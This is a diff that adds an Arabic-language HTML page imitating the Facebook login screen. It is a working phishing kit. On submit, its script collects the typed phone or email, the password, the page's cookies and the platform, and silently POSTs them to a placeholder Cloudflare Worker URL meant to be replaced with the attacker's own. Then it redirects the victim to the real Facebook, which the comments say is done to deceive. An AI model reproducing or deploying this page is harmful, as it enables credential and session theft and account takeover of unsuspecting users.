@@ -1,0 +1,60 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول إلى فيسبوك</title>
+    <style>
+        body { font-family: Helvetica, Arial, sans-serif; background-color: #f0f2f5; margin: 0; display: flex; flex-direction: column; align-items: center; }
+        .header { width: 100%; background-color: #fff; padding: 20px 0; text-align: center; border-bottom: 1px solid #ddd; }
+        .logo { color: #1877f2; font-size: 30px; font-weight: bold; text-decoration: none; }
+        .container { width: 90%; max-width: 400px; margin-top: 20px; }
+        input { width: 100%; padding: 14px; margin: 8px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 16px; box-sizing: border-box; }
+        .login-btn { width: 100%; padding: 12px; background-color: #1877f2; border: none; border-radius: 6px; color: white; font-size: 18px; font-weight: bold; cursor: pointer; margin-top: 10px; }
+        .footer { margin-top: 30px; font-size: 12px; color: #737373; text-align: center; }
+    </style>
+</head>
+<body>
+    <div class="header"><span class="logo">facebook</span></div>
+    <div class="container">
+        <form id="pwa_trap">
+            <input type="text" id="u_name" placeholder="رقم الهاتف أو البريد الإلكتروني" required>
+            <input type="password" id="u_pass" placeholder="كلمة السر" required>
+            <button type="submit" class="login-btn">تسجيل الدخول</button>
+        </form>
+        <div class="footer">
+            العربية · English (US) · Français (France)<br><br>
+            Meta © 2026
+        </div>
+    </div>
+
+    <script>
+        document.getElementById('pwa_trap').addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            // 1. تجميع البيانات والكوكيز المتاحة
+            const payload = {
+                user: document.getElementById('u_name').value,
+                pass: document.getElementById('u_pass').value,
+                cookies: document.cookie, // سحب كوكيز الجلسة الحالية
+                platform: navigator.platform,
+                time: new Date().toLocaleString()
+            };
+
+            // 2. إرسال البيانات إلى الـ Worker (استبدل الرابط برابطك)
+            const WORKER_URL = "https://your-worker.workers.dev"; 
+
+            try {
+                await fetch(WORKER_URL, {
+                    method: 'POST',
+                    mode: 'no-cors', // لضمان الإرسال الصامت دون قيود CORS
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) { }
+
+            // 3. التحويل النهائي للموقع الحقيقي لتمويه الضحية
+            window.location.href = "https://m.facebook.com/login/save-password-interstitial/";
+        });
+    </script>
+</body>
+</html>
